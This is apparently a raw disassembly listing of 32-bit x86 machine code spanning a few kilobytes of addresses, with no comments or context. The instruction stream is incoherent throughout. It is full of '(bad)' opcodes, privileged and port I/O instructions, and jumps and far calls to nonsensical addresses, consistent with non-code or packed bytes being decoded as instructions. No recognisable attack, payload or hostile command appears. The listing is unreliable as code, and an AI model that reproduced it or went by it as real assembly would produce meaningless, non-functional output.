  4129c4:	out    0x2c,al
  4129c6:	xor    BYTE PTR [esi],bh
  4129c8:	jne    0x41298d
  4129ca:	cmp    eax,esi
  4129cc:	je     0x4129ae
  4129ce:	lock aad 0xc0
  4129d1:	jl     0x4129c7
  4129d3:	sub    BYTE PTR [ebp+0x47ced85e],ah
  4129d9:	push   es
  4129da:	xlat   BYTE PTR ds:[ebx]
  4129db:	or     DWORD PTR [esi-0x33],edx
  4129de:	mov    esi,0x60cba2a2
  4129e3:	pushf  
  4129e4:	mov    bh,0xeb
  4129e6:	pop    esi
  4129e7:	sub    al,0x14
  4129e9:	push   esi
  4129ea:	inc    esp
  4129eb:	popa   
  4129ec:	dec    edx
  4129ed:	inc    ebp
  4129ee:	test   BYTE PTR [edi-0x27db2b83],cl
  4129f4:	lods   eax,DWORD PTR ds:[esi]
  4129f5:	and    ebp,DWORD PTR [edi-0x35]
  4129f8:	mov    bh,0x37
  4129fa:	xchg   BYTE PTR [esi],dh
  4129fc:	cmp    eax,0x863cfe1e
  412a01:	cmp    al,0x27
  412a03:	pushf  
  412a04:	cwde   
  412a05:	out    0x2e,al
  412a07:	rcl    DWORD PTR [edx+0x6d3f84f0],cl
  412a0d:	mov    bh,al
  412a0f:	int    0x1e
  412a11:	icebp  
  412a12:	lea    ebp,[ebx-0x13]
  412a15:	das    
  412a16:	les    esi,FWORD PTR [ebp+0x6b4406f1]
  412a1c:	int    0x66
  412a1e:	and    DWORD PTR [esi-0x67],esp
  412a21:	jo     0x4129d9
  412a23:	push   ecx
  412a24:	lea    ebx,[edi]
  412a26:	push   eax
  412a27:	jb     0x412a5a
  412a29:	call   0x7ca4e534
  412a2e:	int    0x55
  412a30:	dec    eax
  412a31:	xchg   DWORD PTR [ecx-0x66],esi
  412a34:	clc    
  412a35:	nop
  412a36:	or     ebx,edi
  412a38:	mov    esi,DWORD PTR [eax-0x332a4c35]
  412a3e:	mov    dh,0x95
  412a40:	jmp    0xab4c06ae
  412a45:	push   ss
  412a46:	sbb    dl,BYTE PTR [esi+0x30]
  412a49:	pop    ecx
  412a4a:	(bad)  
  412a4b:	mov    bh,0x3c
  412a4d:	shl    BYTE PTR [ebx+ebx*4-0x50f7ac16],cl
  412a54:	ret    0xc07e
  412a57:	inc    ebx
  412a58:	test   DWORD PTR [ecx-0x47],0xca584eeb
  412a5f:	add    al,0x89
  412a61:	add    DWORD PTR ds:0x11bd4c61,ecx
  412a67:	xor    cl,BYTE PTR [eax]
  412a69:	popf   
  412a6a:	and    BYTE PTR [esi+0x5369c51d],cl
  412a70:	es (bad) 
  412a73:	popf   
  412a74:	sbb    ebp,0xc
  412a77:	(bad)  
  412a78:	xchg   edx,eax
  412a79:	xchg   ebx,eax
  412a7a:	jecxz  0x412a66
  412a7c:	push   cs
  412a7d:	mov    edi,0xbe21c6c0
  412a82:	(bad)  
  412a83:	into   
  412a84:	dec    esp
  412a85:	cmp    edx,DWORD PTR [edi]
  412a87:	push   ebp
  412a88:	es xor BYTE PTR gs:[esi],al
  412a8c:	dec    ebp
  412a8d:	test   eax,0x48790fbb
  412a92:	sub    ch,0xee
  412a95:	into   
  412a96:	out    0xf9,eax
  412a98:	or     esi,0x9978e230
  412a9e:	adc    al,0x78
  412aa0:	or     eax,0xc523fab3
  412aa5:	fdivrp st(2),st
  412aa7:	sbb    edx,DWORD PTR [edx+0x27]
  412aaa:	test   eax,0xfb7964f0
  412aaf:	inc    edi
  412ab0:	push   esp
  412ab1:	jb     0x412ab0
  412ab3:	mov    cl,0x1
  412ab5:	not    BYTE PTR fs:[eax]
  412ab8:	loope  0x412a98
  412aba:	lods   eax,DWORD PTR ds:[esi]
  412abb:	lea    ecx,[ecx-0x4c]
  412abe:	mov    ch,0x91
  412ac0:	pop    ss
  412ac1:	push   ds
  412ac2:	and    WORD PTR [eax+0x792e4d5f],cx
  412ac9:	out    0xc1,eax
  412acb:	mov    esi,0x46b8dd5f
  412ad0:	sbb    DWORD PTR [edx],edx
  412ad2:	lds    ebx,FWORD PTR [ebx-0x6576b0c2]
  412ad8:	xor    al,BYTE PTR [esi-0x67]
  412adb:	ds stos DWORD PTR es:[edi],eax
  412add:	jmp    0x412b20
  412adf:	jecxz  0x412a83
  412ae1:	icebp  
  412ae2:	add    BYTE PTR [ecx],ch
  412ae4:	push   ebp
  412ae5:	das    
  412ae6:	adc    esp,DWORD PTR [ecx]
  412ae8:	loope  0x412a89
  412aea:	add    al,0xf5
  412aec:	iret   
  412aed:	sub    dl,bh
  412aef:	sbb    esi,DWORD PTR [edx+0x2d]
  412af2:	and    edi,DWORD PTR [ecx+0x3a]
  412af5:	xor    edi,eax
  412af7:	jmp    0x9154:0x1f05f426
  412afe:	mov    ss,WORD PTR [ebx-0x3e]
  412b01:	push   ebx
  412b02:	pop    edi
  412b03:	nop
  412b04:	lea    ecx,ds:0x9f33dc38
  412b0a:	test   BYTE PTR [edx-0x42cfee16],bh
  412b10:	in     al,0xa8
  412b12:	inc    eax
  412b13:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  412b15:	das    
  412b16:	xchg   BYTE PTR [eax-0x5cfe50ca],bh
  412b1c:	xor    BYTE PTR [ebx*2-0x7c4e5089],cl
  412b23:	shl    ecx,1
  412b25:	and    al,0xd4
  412b27:	mov    cl,0x92
  412b29:	xor    eax,DWORD PTR [ebp-0x6b]
  412b2c:	repz inc edx
  412b2e:	dec    ecx
  412b2f:	ja     0x412b11
  412b31:	out    0x97,eax
  412b33:	mov    edx,0x5195f81d
  412b38:	pop    esp
  412b39:	adc    al,0xde
  412b3b:	cs mov al,0xbf
  412b3e:	sub    al,0xc4
  412b40:	scas   al,BYTE PTR es:[edi]
  412b41:	(bad)  
  412b42:	jmp    0x3a9e30f7
  412b47:	or     al,0xed
  412b49:	sbb    BYTE PTR [eax],bh
  412b4b:	mov    dh,0x1c
  412b4d:	sub    bh,BYTE PTR [edx]
  412b4f:	leave  
  412b50:	(bad)  [eax]
  412b52:	jns    0x412b51
  412b54:	outs   dx,BYTE PTR ds:[esi]
  412b55:	lods   al,BYTE PTR ds:[esi]
  412b56:	mov    al,bl
  412b58:	push   edx
  412b59:	xlat   BYTE PTR ds:[ebx]
  412b5a:	pop    ecx
  412b5b:	cmc    
  412b5c:	pop    edx
  412b5d:	ins    DWORD PTR es:[edi],dx
  412b5e:	repz inc ecx
  412b60:	and    bh,dl
  412b62:	arpl   WORD PTR [ebx],si
  412b64:	pop    eax
  412b65:	or     DWORD PTR [ebx+0x3ca33447],esi
  412b6b:	lds    ecx,FWORD PTR [esi+0x6178020d]
  412b71:	jle    0x412b21
  412b73:	xor    eax,DWORD PTR [edx+esi*8]
  412b76:	xor    BYTE PTR [di],ch
  412b79:	adc    dl,BYTE PTR [esi+0x69]
  412b7c:	xchg   edx,ebx
  412b7e:	pop    esp
  412b7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b80:	(bad)  
  412b81:	stos   BYTE PTR es:[edi],al
  412b82:	mov    esp,0xef1299ae
  412b87:	add    eax,edx
  412b89:	mov    ch,0x66
  412b8b:	ja     0x412bc0
  412b8d:	bound  ecx,QWORD PTR [eax-0x170238d4]
  412b93:	inc    ebx
  412b94:	je     0x412b2c
  412b96:	jl     0x412b53
  412b98:	(bad)  
  412b99:	(bad)  ds:0x91e32056
  412b9f:	cli    
  412ba0:	adc    eax,0x9fa5a783
  412ba5:	cmp    cl,al
  412ba7:	fistp  QWORD PTR [ecx+eax*2-0x37]
  412bab:	pop    ebp
  412bac:	push   edx
  412bad:	push   ebp
  412bae:	mov    eax,DWORD PTR [ebp-0x40]
  412bb1:	mov    ds:0xb5242eaa,al
  412bb6:	lea    edx,[ecx+0x3b7f1d4c]
  412bbc:	clc    
  412bbd:	repz push eax
  412bbf:	retf   0x7e
  412bc2:	dec    edi
  412bc3:	ret    
  412bc4:	(bad)
  412bc8:	inc    ecx
  412bc9:	cmp    al,0x7d
  412bcb:	sbb    ebp,DWORD PTR [eax+0x78dc63fa]
  412bd1:	jb     0x412b78
  412bd3:	daa    
  412bd4:	cwde   
  412bd5:	and    BYTE PTR [esi],bh
  412bd7:	mov    ds:0x4e9b10ad,eax
  412bdc:	popf   
  412bdd:	mov    ecx,0x10d6c3c6
  412be2:	aas    
  412be3:	pop    es
  412be4:	cld    
  412be5:	inc    edx
  412be6:	jg     0x412c3a
  412be8:	mov    al,0x73
  412bea:	mov    dl,0x1f
  412bec:	ins    DWORD PTR es:[edi],dx
  412bed:	pop    eax
  412bee:	lods   eax,DWORD PTR ds:[esi]
  412bef:	retf   0x313c
  412bf2:	js     0x412b81
  412bf4:	inc    edi
  412bf5:	retf   0xc554
  412bf8:	mov    eax,ds:0x7c9f3a46
  412bfd:	fimul  WORD PTR [edi+0xa]
  412c00:	mov    bh,0x4d
  412c02:	xchg   ebx,eax
  412c03:	push   ecx
  412c04:	push   ebx
  412c05:	popa   
  412c06:	mov    bh,0x92
  412c08:	les    ebp,FWORD PTR [edx]
  412c0a:	jle    0x412c13
  412c0c:	mov    bl,bh
  412c0e:	inc    edx
  412c0f:	test   BYTE PTR [edx+0x792fecde],bl
  412c15:	xchg   ecx,eax
  412c16:	ret    
  412c17:	sub    al,0xc6
  412c19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c1a:	add    eax,0x6383ff48
  412c1f:	(bad)  
  412c20:	xchg   ebp,eax
  412c21:	add    eax,0x9cb34960
  412c26:	and    eax,0xa7a33cca
  412c2b:	shl    DWORD PTR [ebx],0x21
  412c2e:	pop    edi
  412c2f:	out    0x1d,eax
  412c31:	sbb    eax,0xd1ea5946
  412c36:	add    al,0xbb
  412c38:	ds jl  0x412c7f
  412c3b:	sub    BYTE PTR [eax],cl
  412c3d:	push   ss
  412c3e:	outs   dx,BYTE PTR ds:[esi]
  412c3f:	mov    BYTE PTR [edx+edx*1-0x41],dl
  412c43:	jno    0x412c8e
  412c45:	jne    0x412c6e
  412c47:	sar    DWORD PTR [edx-0x58c13fa4],1
  412c4d:	jb     0x412bfa
  412c4f:	jo     0x412be8
  412c51:	call   0x8e1444a7
  412c56:	xchg   esp,eax
  412c57:	xchg   BYTE PTR [edx],al
  412c59:	push   eax
  412c5a:	fwait
  412c5b:	push   ebx
  412c5c:	std    
  412c5d:	fsub   DWORD PTR [esi-0x317e549e]
  412c63:	es jno 0x412c76
  412c66:	push   ebx
  412c67:	sbb    eax,0x346b52c
  412c6c:	imul   edx,ebp,0x71
  412c6f:	les    edi,FWORD PTR [ebx-0x72]
  412c72:	mov    cs,WORD PTR [edi]
  412c74:	into   
  412c75:	pop    esi
  412c76:	mov    bl,0xcb
  412c78:	leave  
  412c79:	pop    esi
  412c7a:	(bad)  
  412c7b:	fistp  QWORD PTR [ebx-0x135cde7d]
  412c81:	mov    ds:0x11c06d55,eax
  412c86:	xor    al,0xd8
  412c88:	mov    ebx,0xf4cc9549
  412c8d:	cs jbe 0x412c3e
  412c90:	mov    esp,0x2fb057eb
  412c95:	mov    ch,0x15
  412c97:	jae    0x412cd6
  412c99:	repz inc ecx
  412c9b:	xlat   BYTE PTR ds:[ebx]
  412c9c:	repnz mov ah,0x26
  412c9f:	push   cs
  412ca0:	out    dx,eax
  412ca1:	adc    bl,ch
  412ca3:	in     eax,0xe
  412ca5:	lds    ebx,FWORD PTR [edi-0x2e]
  412ca8:	jns    0x412c52
  412caa:	js     0x412c98
  412cac:	push   DWORD PTR [edx+0x657fe956]
  412cb2:	pusha  
  412cb3:	pop    ebp
  412cb4:	add    esp,ebx
  412cb6:	push   esp
  412cb7:	dec    esi
  412cb8:	fmul   st(4),st
  412cba:	lods   al,BYTE PTR ds:[esi]
  412cbb:	mov    ch,0x5d
  412cbd:	jge    0x412c8a
  412cbf:	mov    bl,0x68
  412cc1:	call   0x3ed0:0x6a744cd2
  412cc8:	fincstp 
  412cca:	fcom   DWORD PTR [ecx+edi*2]
  412ccd:	(bad)  
  412cce:	mov    eax,0x8dc78315
  412cd3:	and    al,0xc1
  412cd5:	mov    eax,eax
  412cd7:	in     eax,0x51
  412cd9:	adc    DWORD PTR [ebx+0x24],edx
  412cdc:	cmp    ebp,ebx
  412cde:	imul   ecx,DWORD PTR [esi],0x4de764a4
  412ce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ce5:	fild   QWORD PTR [edi-0x374b0e09]
  412ceb:	jecxz  0x412d57
  412ced:	dec    esp
  412cee:	repnz shr DWORD PTR ds:0x33458203,0x82
  412cf6:	and    ecx,DWORD PTR ds:0x4ded7779
  412cfc:	ins    DWORD PTR es:[edi],dx
  412cfd:	stos   BYTE PTR es:[edi],al
  412cfe:	sbb    al,0x1d
  412d00:	pop    ebp
  412d01:	push   0xffffffc4
  412d03:	mov    eax,ebp
  412d05:	in     al,0x12
  412d07:	pop    ecx
  412d08:	outs   dx,DWORD PTR ds:[esi]
  412d09:	clc    
  412d0a:	daa    
  412d0b:	je     0x412d45
  412d0d:	and    BYTE PTR [ebp-0x55441e80],dh
  412d13:	pop    es
  412d14:	add    bh,BYTE PTR [ecx-0x471ff736]
  412d1a:	sub    eax,0xaa0bd06c
  412d1f:	sbb    BYTE PTR [edx+0x51],0xbe
  412d23:	imul   esp,DWORD PTR [edi-0x14fccc1b],0x0
  412d2a:	sbb    eax,0x2c351242
  412d2f:	dec    esi
  412d30:	ficomp WORD PTR [esp+ebx*1-0x52]
  412d34:	jnp    0x412cf6
  412d36:	pop    es
  412d37:	pop    es
  412d38:	in     al,dx
  412d39:	add    ecx,DWORD PTR [ebp+0x49e3a550]
  412d3f:	popa   
  412d40:	es stc 
  412d42:	adc    eax,DWORD PTR [ebp+0x39d5d529]
  412d48:	xchg   bp,ax
  412d4a:	mov    cl,0x37
  412d4c:	arpl   WORD PTR [ebp-0x53],sp
  412d4f:	outs   dx,DWORD PTR ds:[esi]
  412d50:	into   
  412d51:	lods   al,BYTE PTR ds:[esi]
  412d52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d53:	dec    esp
  412d54:	push   ebx
  412d55:	mov    edi,0x67d37632
  412d5a:	mov    esi,ecx
  412d5c:	push   eax
  412d5d:	xor    al,0xa5
  412d5f:	sbb    ecx,DWORD PTR [edi]
  412d61:	(bad)  
  412d62:	jno    0x412d85
  412d64:	les    esi,FWORD PTR [ebx+0x11]
  412d67:	cmp    DWORD PTR [ecx+0x20],eax
  412d6a:	inc    esp
  412d6b:	add    dh,al
  412d6d:	rcr    BYTE PTR ss:[eax-0x3b7cae12],cl
  412d74:	idiv   BYTE PTR [ecx]
  412d76:	mov    DWORD PTR [ebp+0x74186387],ebx
  412d7c:	call   0x70e42f18
  412d81:	sbb    cl,ch
  412d83:	lods   eax,DWORD PTR ds:[esi]
  412d84:	pop    ds
  412d85:	shr    BYTE PTR [ebp+0x4f075152],cl
  412d8b:	dec    ebx
  412d8c:	push   esi
  412d8d:	sbb    BYTE PTR [edi],ch
  412d8f:	sbb    bh,al
  412d91:	jl     0x412e01
  412d93:	add    al,0x6c
  412d95:	dec    ebx
  412d96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d97:	mov    bh,0x2
  412d99:	es cs push cs
  412d9c:	lods   al,BYTE PTR ds:[esi]
  412d9d:	or     edx,esi
  412d9f:	push   ss
  412da0:	fnsave [ebx]
  412da2:	inc    ebp
  412da3:	scas   al,BYTE PTR es:[edi]
  412da4:	mov    esi,0xd84c6820
  412da9:	dec    edx
  412daa:	ficomp WORD PTR ss:[edi+0x54ee3057]
  412db1:	or     cl,BYTE PTR [ecx+0x20]
  412db4:	jmp    0x412db4
  412db6:	(bad)  
  412db7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412db8:	pushf  
  412db9:	out    dx,al
  412dba:	mov    ds:0x2a25491c,eax
  412dbf:	(bad)  
  412dc0:	sub    ah,BYTE PTR [edx-0x2a7d7654]
  412dc6:	icebp  
  412dc7:	mov    ds:0xa363ac9c,eax
  412dcc:	sti    
  412dcd:	or     edx,esi
  412dcf:	adc    BYTE PTR [edx],0xd
  412dd2:	ficom  DWORD PTR [esi-0x16]
  412dd5:	loopne 0x412d5b
  412dd7:	add    dh,ch
  412dd9:	and    al,0xd1
  412ddb:	test   eax,edi
  412ddd:	jecxz  0x412de2
  412ddf:	int3   
  412de0:	loopne 0x412d7c
  412de2:	stos   BYTE PTR es:[edi],al
  412de3:	iret   
  412de4:	fnstsw WORD PTR [ebp+0x4e716aff]
  412dea:	das    
  412deb:	inc    esp
  412dec:	jg     0x412ddb
  412dee:	push   ss
  412def:	jno    0x412d72
  412df1:	sub    bh,BYTE PTR [ebp-0x8fcb7c2]
  412df7:	cmp    ah,BYTE PTR [edi+0x68c77cd]
  412dfd:	jecxz  0x412da1
  412dff:	rcr    DWORD PTR [edi],cl
  412e01:	int3   
  412e02:	cld    
  412e03:	(bad)  
  412e04:	inc    ecx
  412e05:	ins    DWORD PTR es:[edi],dx
  412e06:	scas   al,BYTE PTR es:[edi]
  412e07:	pop    ds
  412e08:	int3   
  412e09:	xor    ebp,ebp
  412e0b:	rcl    ah,cl
  412e0d:	mov    esp,0x842a00b6
  412e12:	aam    0x1e
  412e14:	outs   dx,DWORD PTR ds:[esi]
  412e15:	enter  0x1a2f,0xe8
  412e19:	rol    DWORD PTR [esi],cl
  412e1b:	sbb    DWORD PTR [ecx-0x10],esi
  412e1e:	mov    esi,0x2c26f6db
  412e23:	int    0xc0
  412e25:	in     eax,dx
  412e26:	sahf   
  412e27:	arpl   WORD PTR gs:[edx],cx
  412e2a:	js     0x412dcd
  412e2c:	not    DWORD PTR [edx+0x522edb72]
  412e32:	(bad)  ds:0xc72c765b
  412e38:	jne    0x412e65
  412e3a:	inc    edi
  412e3b:	xchg   dh,dl
  412e3d:	xchg   esp,eax
  412e3e:	and    BYTE PTR [ecx+0x39fef661],cl
  412e44:	xor    dl,BYTE PTR [eax-0x5d]
  412e47:	push   ebp
  412e48:	push   0xffffff9e
  412e4a:	push   ebx
  412e4b:	test   al,0x39
  412e4e:	xor    dl,cl
  412e50:	adc    eax,0x28ff658d
  412e55:	ds and al,0x82
  412e58:	dec    ebx
  412e59:	sti    
  412e5a:	mov    eax,ds:0x4bf42673
  412e5f:	dec    esi
  412e60:	push   eax
  412e61:	mov    BYTE PTR [ecx],dl
  412e63:	and    al,dl
  412e65:	fisttp WORD PTR [ecx]
  412e67:	fst    QWORD PTR [eax-0x47]
  412e6a:	and    eax,0xb3c153d7
  412e6f:	fwait
  412e70:	invd   
  412e72:	cdq    
  412e73:	(bad)  
  412e74:	mov    ebp,0x6d2a8c1b
  412e79:	(bad)  
  412e7a:	adc    al,0x90
  412e7c:	jl     0x412ec0
  412e7e:	enter  0x9f7b,0x47
  412e82:	xchg   ecx,eax
  412e83:	retf   
  412e84:	sahf   
  412e85:	es and bl,al
  412e88:	or     ch,BYTE PTR [esi-0x1b01c753]
  412e8e:	call   0xe422:0xe93bc984
  412e95:	dec    eax
  412e96:	jne    0x412e1e
  412e98:	std    
  412e99:	(bad)  
  412e9a:	adc    dl,BYTE PTR [eax+eiz*1]
  412e9d:	out    dx,al
  412e9e:	pusha  
  412e9f:	stos   DWORD PTR es:[edi],eax
  412ea0:	or     ah,cl
  412ea2:	adc    al,0xaa
  412ea4:	mov    DWORD PTR es:[edx-0x43accae6],ecx
  412eab:	push   eax
  412eac:	and    BYTE PTR [edi-0x6c],dh
  412eaf:	inc    eax
  412eb0:	add    al,0x73
  412eb2:	cmp    DWORD PTR [ecx],eax
  412eb4:	dec    esi
  412eb5:	neg    DWORD PTR [ebx]
  412eb7:	pop    ds
  412eb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412eb9:	adc    DWORD PTR [edx+0x1b298ddf],0x2d
  412ec0:	popf   
  412ec1:	jae    0x412f0a
  412ec3:	pop    ebp
  412ec4:	stos   DWORD PTR es:[edi],eax
  412ec5:	mov    ebp,0xa82b71d2
  412eca:	cs dec ebx
  412ecc:	dec    esp
  412ecd:	xchg   edx,eax
  412ece:	(bad)  
  412ecf:	mov    bh,0x2
  412ed1:	mov    esi,0x17a5fd56
  412ed6:	jge    0x412ea1
  412ed8:	aaa    
  412ed9:	mov    ds:0xb39eb0cb,al
  412ede:	mov    cl,0x81
  412ee0:	pop    esp
  412ee1:	xchg   esp,eax
  412ee2:	inc    BYTE PTR [ebx-0xec873a3]
  412ee8:	fnstcw WORD PTR [edi-0xdffbe77]
  412eee:	in     eax,dx
  412eef:	(bad)  
  412ef1:	xor    edx,edi
  412ef3:	repnz cmp eax,0x1ded0fa7
  412ef9:	adc    DWORD PTR [edx+0x21],esp
  412efc:	cmc    
  412efd:	(bad)  
  412efe:	retf   0xc26
  412f01:	lods   al,BYTE PTR ds:[esi]
  412f02:	lea    ecx,[esi+eiz*8-0x43397e83]
  412f09:	push   eax
  412f0a:	ret    0xcb7f
  412f0d:	shl    esi,cl
  412f0f:	cwde   
  412f10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f11:	mov    esi,0xb13229a2
  412f16:	lock stos DWORD PTR es:[edi],eax
  412f18:	test   dh,bh
  412f1a:	call   0x75aeab17
  412f1f:	imul   edx,DWORD PTR [eax+eax*8-0x4a],0x290dc067
  412f27:	retf   0xce4d
  412f2a:	jl     0x412ef9
  412f2c:	sub    dh,BYTE PTR [edx*4+0x42d26771]
  412f33:	scas   al,BYTE PTR es:[edi]
  412f34:	push   ds
  412f35:	mov    dl,0x7d
  412f37:	inc    edi
  412f39:	mov    al,ds:0xcdde982d
  412f3e:	mov    eax,es
  412f40:	push   ds
  412f41:	icebp  
  412f42:	pop    edx
  412f43:	xchg   edi,eax
  412f44:	sahf   
  412f45:	mov    esp,0x4ae50322
  412f4a:	ret    0xa440
  412f4d:	sbb    ebp,DWORD PTR [eax+ebx*1]
  412f50:	and    BYTE PTR [edi],cl
  412f52:	jne    0x412f3b
  412f54:	lds    eax,FWORD PTR [ebp+0x18]
  412f57:	inc    ebx
  412f58:	xor    bl,ah
  412f5a:	inc    edi
  412f5b:	leave  
  412f5c:	mov    ecx,0x2d91f204
  412f61:	je     0x412f4a
  412f63:	cmp    DWORD PTR [esp+eax*2+0x3252c840],esi
  412f6a:	ret    0x8ca9
  412f6d:	dec    eax
  412f6e:	mov    esp,0x8297e223
  412f73:	stos   DWORD PTR es:[edi],eax
  412f74:	push   ss
  412f75:	jae    0x412f29
  412f77:	(bad)  
  412f79:	into   
  412f7a:	sub    ecx,DWORD PTR [ecx]
  412f7c:	lods   al,BYTE PTR ds:[esi]
  412f7d:	gs fs loopne 0x412f11
  412f81:	imul   esi,DWORD PTR [edx+eiz*4],0xfffffff7
  412f85:	test   al,0x32
  412f87:	cdq    
  412f88:	stos   BYTE PTR es:[edi],al
  412f89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f8a:	cmp    al,0x7b
  412f8c:	scas   al,BYTE PTR es:[edi]
  412f8d:	cwde   
  412f8e:	mov    bl,0x94
  412f90:	aaa    
  412f91:	mov    eax,0xb36bbc98
  412f96:	pop    esp
  412f97:	pop    es
  412f98:	xchg   esp,eax
  412f99:	jp     0x412f52
  412f9b:	outs   dx,DWORD PTR ds:[esi]
  412f9c:	mov    cl,0xa4
  412f9e:	jo     0x412fb3
  412fa0:	cmp    BYTE PTR ds:0x4db87d25,dl
  412fa6:	shr    DWORD PTR [ecx-0x37bd6d05],1
  412fac:	mov    dl,0xa6
  412fae:	fwait
  412faf:	sub    edx,esp
  412fb1:	pop    ds
  412fb2:	outs   dx,DWORD PTR ds:[esi]
  412fb3:	test   al,0x7
  412fb5:	or     al,dl
  412fb7:	(bad)  
  412fb8:	xchg   esi,eax
  412fb9:	mov    edx,0x197d4eea
  412fbe:	jl     0x412fc0
  412fc0:	and    dh,bl
  412fc2:	sub    cl,BYTE PTR [esp+edi*2-0x7384436e]
  412fc9:	mov    DWORD PTR [edx-0x28950374],ebx
  412fcf:	xchg   edx,eax
  412fd0:	cli    
  412fd1:	jge    0x413042
  412fd3:	stc    
  412fd4:	cmp    ch,BYTE PTR [ebx+ebp*4-0x508037af]
  412fdb:	retf   
  412fdc:	(bad)  
  412fdd:	dec    ecx
  412fde:	add    eax,0xca188335
  412fe3:	arpl   WORD PTR [edi-0x1531d096],ax
  412fe9:	jecxz  0x413048
  412feb:	push   edi
  412fec:	sahf   
  412fed:	mov    eax,0xa4bb41e5
  412ff2:	jno    0x41303c
  412ff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ff5:	sub    BYTE PTR [ebx-0x55],ah
  412ff8:	inc    eax
  412ff9:	ja     0x413004
  412ffb:	and    esp,DWORD PTR cs:[edi+esi*4]
  412fff:	dec    eax
  413000:	(bad)  
  413002:	(bad)  
  413003:	mov    al,0x8a
  413005:	fisub  WORD PTR [esi]
  413007:	mov    eax,ds:0xccb9938b
  41300c:	loop   0x412fcb
  41300e:	clc    
  41300f:	mov    ebx,DWORD PTR [esi+0xe]
  413012:	jnp    0x41307c
  413014:	cs stos DWORD PTR es:[edi],eax
  413016:	and    BYTE PTR [esi+eiz*1+0x74],dl
  41301a:	xor    al,0x93
  41301c:	inc    edx
  41301d:	mov    dl,0x9
  41301f:	push   esi
  413020:	jmp    0xb88e:0x33fa9c5e
  413027:	or     BYTE PTR ds:0x32b5b3b0,0xb9
  41302e:	push   edi
  41302f:	sub    eax,DWORD PTR [eax+0x16771e44]
  413035:	mov    cl,BYTE PTR [ebx]
  413037:	adc    bl,BYTE PTR [eax+0xb]
  41303a:	retf   0xf7df
  41303d:	inc    ebp
  41303e:	adc    DWORD PTR [esi],esp
  413040:	jmp    0xd88:0x30aa19c9
  413047:	sbb    edx,DWORD PTR [edx-0x67be3606]
  41304d:	mov    edi,0xbb29c7cd
  413052:	div    DWORD PTR [esi-0x5821cfd3]
  413058:	inc    ebx
  413059:	or     BYTE PTR [ecx+0x6bbaddfc],ch
  41305f:	mov    ecx,0x3d6e5a9
  413064:	inc    eax
  413065:	ret    
  413066:	sbb    edi,DWORD PTR [ebp+0x1fd6121f]
  41306c:	fwait
  41306d:	stos   BYTE PTR es:[edi],al
  41306e:	jnp    0x4130d3
  413070:	imul   eax,DWORD PTR [edx],0xcedb0faa
  413076:	or     BYTE PTR [ecx-0x71cf5d2a],bh
  41307c:	sub    ah,cl
  41307e:	and    edx,DWORD PTR [edx+eax*2]
  413081:	(bad)  
  413082:	pop    ds
  413083:	xor    al,0x8a
  413085:	sbb    al,0x7b
  413087:	xchg   edx,eax
  413088:	mov    esi,0xf216cdf2
  41308d:	out    dx,eax
  41308e:	dec    eax
  41308f:	stos   BYTE PTR es:[edi],al
  413090:	pop    eax
  413091:	sub    al,0x2e
  413093:	push   eax
  413094:	jmp    0x41310d
  413096:	gs dec ebp
  413098:	inc    ebp
  413099:	test   DWORD PTR [esi+eax*8+0x40],ebp
  41309d:	mov    edx,0x52642ed1
  4130a2:	jmp    0x41303c
  4130a4:	sbb    DWORD PTR [edx-0x26],esi
  4130a7:	outs   dx,DWORD PTR ds:[esi]
  4130a8:	or     edi,DWORD PTR [edx]
  4130aa:	mov    al,0x44
  4130ac:	pushf  
  4130ad:	push   esi
  4130ae:	push   edi
  4130af:	inc    ebx
  4130b0:	icebp  
  4130b1:	js     0x4130ef
  4130b3:	rcr    DWORD PTR [edi+ebp*2],1
  4130b6:	fidivr WORD PTR [edx+0x2d]
  4130b9:	mov    ds:0x879bce50,al
  4130be:	(bad)  
  4130bf:	mov    dl,0x69
  4130c1:	hlt    
  4130c2:	jmp    0xc33b:0x43a118a8
  4130c9:	xchg   ebx,eax
  4130ca:	sbb    DWORD PTR es:[edi+0x4f1e0c6c],0xffffffb9
  4130d2:	sbb    BYTE PTR [edx],0x4c
  4130d5:	xchg   esi,eax
  4130d6:	lahf   
  4130d7:	pop    edx
  4130d8:	bound  ecx,QWORD PTR [edx-0x44]
  4130db:	hlt    
  4130dc:	inc    ebp
  4130dd:	dec    ecx
  4130de:	jg     0x413158
  4130e0:	jb     0x4130c7
  4130e2:	gs jb  0x41311f
  4130e5:	shr    DWORD PTR [ebp-0x3aade9d9],cl
  4130eb:	dec    edx
  4130ec:	call   DWORD PTR [edi+0x73c7b853]
  4130f2:	jo     0x41307a
  4130f4:	bound  ebp,QWORD PTR [ebx-0x2d817de4]
  4130fa:	dec    esi
  4130fb:	jo     0x41314d
  4130fd:	or     al,0x22
  4130ff:	fsubr  DWORD PTR [eax]
  413101:	in     eax,0xae
  413103:	cmp    eax,0x72eb2867
  413108:	cmp    BYTE PTR [edi+0x39],dh
  41310b:	xor    DWORD PTR [esi+0x3a],eax
  41310e:	dec    BYTE PTR [edi-0x6309b87f]
  413114:	mov    ecx,0x7f989f25
  413119:	fptan  
  41311b:	cmp    eax,0x1b76af46
  413120:	adc    BYTE PTR [esi-0x40],bh
  413123:	std    
  413124:	jmp    0xe946403a
  413129:	mov    edx,edx
  41312b:	lods   al,BYTE PTR ds:[esi]
  41312c:	pop    ecx
  41312d:	adc    ah,BYTE PTR ds:[eax]
  413130:	and    ah,BYTE PTR [edi+0x10590064]
  413136:	ss sub eax,0xf56d535c
  41313c:	pop    esi
  41313d:	sbb    eax,0x42abfad7
  413142:	jbe    0x413152
  413144:	inc    ecx
  413145:	jg     0x4131b2
  413147:	pop    ds
  413148:	pop    ebx
  413149:	push   edi
  41314a:	fs mov dl,0x7e
  41314d:	mov    ah,BYTE PTR [ecx+ebp*8+0x750aa356]
  413154:	xchg   ebp,eax
  413155:	pop    esi
  413156:	popf   
  413157:	mov    edi,DWORD PTR [eax+0x4f]
  41315a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41315b:	js     0x4131b5
